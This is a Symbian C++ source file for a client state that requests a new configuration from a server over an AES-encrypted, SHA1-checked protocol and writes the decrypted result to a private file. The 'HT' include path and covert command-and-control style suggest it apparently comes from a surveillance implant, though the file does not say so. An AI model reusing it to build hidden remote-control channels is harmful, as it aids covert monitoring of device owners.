/*
 * StateNewConf.cpp
 *
 *  Created on: 17/feb/2011
 *      Author: Giovanna
 */

#include "StateNewConf.h"

#include "Keys.h"
#include <HT\FileUtils.h>
#include <HT\ShaUtils.h>
#include <HT\AES.h>
#include <HT\RESTUtils.h>

CStateNewConf::CStateNewConf(MStateObserver& aObserver) :
	CAbstractState(EState_NewConf, aObserver)
	{
	// No implementation required
	}

CStateNewConf::~CStateNewConf()
	{
	delete iRequestData;
	delete iResponseData;
	}

CStateNewConf* CStateNewConf::NewLC(MStateObserver& aObserver)
	{
	CStateNewConf* self = new (ELeave) CStateNewConf(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStateNewConf* CStateNewConf::NewL(MStateObserver& aObserver)
	{
	CStateNewConf* self = CStateNewConf::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStateNewConf::ConstructL()
	{
	}

void CStateNewConf::ActivateL(const TDesC8& aData)
	{
	// Parameter aData stores the K key
	iSignKey.Copy(aData);
	
	TBuf8<32> plainBody;
	//append command
	plainBody.Copy(KProto_NewConf);
	//calculate SHA1
	TBuf8<20> sha;
	ShaUtils::CreateSha(plainBody,sha);
	//append SHA1
	plainBody.Append(sha);
	//encrypt 
	RBuf8 buff(AES::EncryptPkcs5L(plainBody, KIV, iSignKey));
	buff.CleanupClosePushL();
	
	//add REST header
	HBufC8* header = iObserver.GetRequestHeaderL();
	TBuf8<32> contentLengthLine;
	contentLengthLine.Append(KContentLength);
	contentLengthLine.AppendNum(buff.Size());
	contentLengthLine.Append(KNewLine);
	iRequestData = HBufC8::NewL(header->Size()+contentLengthLine.Size()+KNewLine().Size()+buff.Size());
	iRequestData->Des().Append(*header);
	delete header;
	iRequestData->Des().Append(contentLengthLine);
	iRequestData->Des().Append(KNewLine);
	iRequestData->Des().Append(buff);
	CleanupStack::PopAndDestroy(&buff);
	//send
	iObserver.SendStateDataL(*iRequestData);
	}

void CStateNewConf::ProcessDataL(const TDesC8& aData)
	{
	//free resources
	delete iRequestData;
	iRequestData = NULL;
			
	if(aData.Size()!=0)
		{
		if(iResponseData == NULL)
			{
			iResponseData = aData.AllocL();
			}
		else
			{
			TInt size = iResponseData->Size();
			iResponseData = iResponseData->ReAllocL(size+aData.Size()); //TODO:check this
			iResponseData->Des().Append(aData);
			}
		return;
		}
		
	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
		{
		//server answered with a redirect
		iObserver.ResponseError(KErrContent);
		return;
		}
		
	//extract body from response
	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
	body.CleanupClosePushL();
	//decrypt	
	RBuf8 plainBody(AES::DecryptPkcs5L(body,KIV,iSignKey));
	CleanupStack::PopAndDestroy(&body);
	plainBody.CleanupClosePushL();
	
	//check sha1
	if(!ShaUtils::ValidateSha(plainBody.Left(plainBody.Size()-20),plainBody.Right(20)))
		{
		CleanupStack::PopAndDestroy(&plainBody);
		iObserver.ResponseError(KErrSha);
		return;
		}
	//check response		
	if(plainBody.Left(4).Compare(KProto_Ok) == 0)
		{
		//there's a new config
		RFs fs;
		User::LeaveIfError(fs.Connect());
		CleanupClosePushL(fs);

		TFullName filename;
		filename.Copy(KTMP_CONFNAME);
		FileUtils::CompleteWithPrivatePathL(fs, filename);
		RFile aFile;
		aFile.Replace(fs, filename, EFileWrite | EFileStream);
		aFile.Write(plainBody.Mid(8,plainBody.Size()-28));  //8 = OK|len, also strip final sha (20 bytes)
		aFile.Close();
			
		CleanupStack::PopAndDestroy(&fs);
				
		iObserver.NewConfigAvailable();
		}
	CleanupStack::PopAndDestroy(&plainBody);
	iObserver.ChangeStateL();
	
	}

